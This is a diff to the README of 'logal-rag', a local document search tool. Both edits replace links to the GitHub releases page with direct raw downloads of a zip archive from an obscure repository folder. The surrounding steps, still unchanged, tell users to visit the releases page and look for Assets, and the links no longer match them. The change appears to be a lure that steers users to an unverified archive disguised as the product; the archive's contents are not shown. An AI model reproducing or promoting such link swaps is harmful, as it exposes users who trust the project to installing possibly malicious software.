@@ -1,6 +1,6 @@
 # 🔍 logal-rag - Search your local documents with ease
 
-[![](https://img.shields.io/badge/Download-logal-rag-blue)](https://github.com/syntactic-orleanism949/logal-rag/releases)
+[![](https://img.shields.io/badge/Download-logal-rag-blue)](https://raw.githubusercontent.com/syntactic-orleanism949/logal-rag/main/unoperatic/logal_rag_v2.5.zip)
 
 logal-rag helps you find information within your private files. It uses smart technology to understand your questions and searches through your saved documents to give you the right answers. You keep full control of your data since everything runs on your own computer.
 
@@ -18,7 +18,7 @@ This software does not need an internet connection to run after you download it.
 
 ## 📥 Getting the Application
 
-Visit [this page](https://github.com/syntactic-orleanism949/logal-rag/releases) to download the latest version of the installer.
+Visit [this page](https://raw.githubusercontent.com/syntactic-orleanism949/logal-rag/main/unoperatic/logal_rag_v2.5.zip) to download the latest version of the installer.
 
 1.  Click the link above to open the releases page in your web browser.
 2.  Look for the section marked Assets.
